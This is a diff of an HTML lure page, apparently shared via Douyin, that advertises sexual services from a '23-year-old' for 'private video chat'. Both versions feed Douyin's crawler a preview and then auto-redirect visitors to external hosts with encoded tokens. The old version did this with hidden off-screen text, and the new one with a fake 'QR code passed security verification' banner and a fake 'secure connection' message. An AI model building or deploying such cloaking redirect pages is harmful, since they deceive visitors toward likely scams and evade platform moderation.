@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- 抖音分享标题 -->
     <title>23岁小雅在线等你💕 一对一私密视频聊天</title>
     
     <!-- 抖音预览卡片标签 -->
@@ -12,46 +11,154 @@
     <meta property="og:description" content="只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人">
     <meta property="og:image" content="https://douyin1688.github.io/333.png">
     
-    <style>
-        body {
+    <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
+    
+    <style type="text/css">
+        /* 重置样式 */
+        * {
             margin: 0;
             padding: 0;
-            background: #000;
-            font-family: Arial, sans-serif;
+            box-sizing: border-box;
         }
-        
-        .hidden-content {
-            position: absolute;
-            left: -9999px;
-            top: -9999px;
-            width: 1px;
-            height: 1px;
-            overflow: hidden;
-            color: white;
+
+        body {
+            background: #eee;
+            color: #000;
+            font-size: 16px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding-top: 45px;
+        }
+
+        /* 顶部安全验证条 */
+        #safety {
+            width: 100%;
+            height: 45px;
+            background: #e8fef2;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .icon {
+            width: 26px;
+            height: 26px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%2307c160'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            margin: 0 10px;
+            flex-shrink: 0;
+        }
+
+        .text {
+            color: rgb(7, 193, 96);
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* 主内容区域 */
+        .code-box {
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            word-break: break-all;
+        }
+
+        .code-title {
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        .special-text {
+            color: #e74c3c;
+            font-style: italic;
+            font-family: "Times New Roman", serif;
+        }
+
+        .code-qrcode {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .code-qrcode img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .code-qrcode div {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* 加载提示 */
+        .loading-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+            transition: color 0.3s ease;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .code-box {
+                margin: 10px;
+                padding: 20px 15px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- 隐藏的预览图，仅用于抖音抓取 -->
-    <img src="./333.png" alt="预览图" style="display: none; position: absolute; left: -9999px; width: 1px; height: 1px;">
-    
-    <!-- 隐藏的文字内容，供抖音爬虫抓取 -->
-    <div class="hidden-content">
-        <h1>23岁小雅在线等你💕 一对一私密视频聊天</h1>
-        <p>只进入身体不进入生活 | 高清视频通话 | 私密互动体验 | 仅限成年人</p>
-        <p>嗨～帅哥，想和我深入聊聊吗？我们可以私密见面哦～</p>
+    <!-- 顶部安全验证提示 -->
+    <div id="safety">
+        <div class="icon"></div>
+        <div class="text">二维码已通过安全验证（外部🔗请点继续访问）</div>
     </div>
-  
+
+    <!-- 主要内容页面（所有用户都显示） -->
+    <div class="code-box">
+        <div class="code-title">想和我<span class="special-text">深入聊聊</span>吗？<br>同城附近柯阅 25以下勿扰…</div>
+        
+        <div class="code-qrcode">
+            <img src="./333.png" alt="小雅私密聊天">
+            <div>只进入身体，不进入生活 有门槛！同城<span class="special-text">私密见面</span>，</div>
+        </div>
+        
+        <div class="loading-text">正在建立安全连接，即将跳转...</div>
+    </div>
+
     <script>
+        // 配置跳转域名变量
+        var targetUrl = "https://cdbapi.56zly.com/profile/upload/2025/06/14/60ced4bd-250a-4ff7-b130-04227ea5bfde.html?token=aHZwdnswIyFlI2B8K31tcw5OVl5dRl8AU1wbB1VLVk50LmsMDwcvPz8CJGd3a2trUFJSX1xaX1lCRFoeDBcQ";
+        
+        // 页面加载完成后直接跳转（不区分浏览器）
+        document.addEventListener('DOMContentLoaded', function() {
+            // 3秒后跳转，给抖音爬虫足够时间抓取页面
+            setTimeout(function() {
+                window.location.href = targetUrl;
+            }, 3000);
+        });
+        
         // 防止页面被嵌入iframe
         if (window.top !== window.self) {
             window.top.location = window.self.location;
         }
-        
-        // 延迟跳转，给抖音爬虫时间抓取
-        setTimeout(function() {
-            window.location.href = "http://qtjtec.com/template/default/images/index/temp/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQAVcEwADFkZAWTEMHA0pABsJRlBaUl9FWlpRUVxSW0ZBAh0MAQ%3D%3D";
-        }, 2000);
     </script>
 </body>
 </html>
